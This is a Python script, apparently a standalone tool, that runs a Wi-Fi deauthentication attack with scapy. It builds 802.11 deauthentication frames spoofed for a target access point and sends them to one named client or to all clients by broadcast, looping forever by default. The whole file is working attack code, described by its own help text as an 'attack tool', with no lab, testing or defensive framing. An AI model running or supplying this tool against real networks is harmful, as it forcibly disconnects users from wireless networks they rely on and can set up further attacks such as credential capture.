import argparse
import time
from scapy.all import *

def send_deauth(interface, bssid, stamac=None, count=None):
    if stamac:
        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Attacking... STMAC: {stamac}")
    else:
        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Attacking... Sending to broadcast - BSSID {bssid}")

    # Deauthentication packet creation
    pkt = RadioTap()/Dot11(type=0, subtype=12, addr1=bssid, addr2=stamac if stamac else 'ff:ff:ff:ff:ff:ff', addr3=bssid)/Dot11Deauth()

    # If count is 0, infinite loop
    i = 0
    while count == 0 or i < count:
        sendp(pkt, iface=interface, verbose=0)
        i += 1
        time.sleep(1)
        if count != 0 and i % 10 == 0:  # Print progress every 10 packets
            print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Sent {i} packets...")

def main():
    # Argument parser setup
    parser = argparse.ArgumentParser(description="Deauthentication attack tool using scapy.")
    parser.add_argument('interface', help="The network interface to use.")
    parser.add_argument('-a', '--bssid', required=True, help="The BSSID (AP MAC) to target.")
    parser.add_argument('-c', '--stamac', help="The STA MAC (client MAC) to attack. If not specified, attack all clients.")
    parser.add_argument('-n', '--count', type=int, default=0, help="Number of deauth packets to send. Use 0 for infinite.")
    
    args = parser.parse_args()

    # Call send_deauth to initiate attack
    send_deauth(args.interface, args.bssid, args.stamac, args.count)

if __name__ == "__main__":
    main()
